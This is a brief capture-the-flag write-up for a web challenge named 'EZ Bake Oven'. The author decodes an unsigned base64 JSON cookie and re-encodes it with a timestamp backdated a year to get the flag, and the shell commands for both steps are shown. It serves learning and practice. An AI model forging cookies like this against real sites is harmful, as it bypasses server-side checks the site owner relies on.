# EZ Bake Oven

```
Do you like baking? Don't leave the oven on for too long!

Open the Deployment tab to start this challenge.

```

When we get to the site we see we're presented with a list of things that we can "Cook".

Watching the requests happen we can see that when we click on the cook links there is a post request to the the `/cook` endpoint with the following body

`{recipe: "Magic Cookies"}`

The response contains a new cookies 
`Set-Cookie: in_oven=eyJyZWNpcGUiOiAiTWFnaWMgQ29va2llcyIsICJ0aW1lIjogIjA5LzI3LzIwMjAsIDE4OjU1OjEwIn0=; Path=/`

This looks like base64 so lets try decode it.. 

```
$ echo -n 'eyJyZWNpcGUiOiAiTWFnaWMgQ29va2llcyIsICJ0aW1lIjogIjA5LzI3LzIwMjAsIDE4OjU1OjEwIn0=' | base64 -d
{"recipe": "Magic Cookies", "time": "09/27/2020, 18:55:10"}
``

So that looks like the time that I clicked the cook button, I wwoner what happens if we set the time back a bit. 

```
echo -n "{\"recipe\": \"Magic Cookies\", \"time\": \"`date +%d/%m/%Y -d '1 year ago'`, 18:55:10\"}" | base64
eyJyZWNpcGUiOiAiTWFnaWMgQ29va2llcyIsICJ0aW1lIjogIjI3LzA5LzIwMTksIDE4OjU1OjEwIn0=
```

Set the in the browser as the in_oven cookie, refresh the page a voila, we have a flag.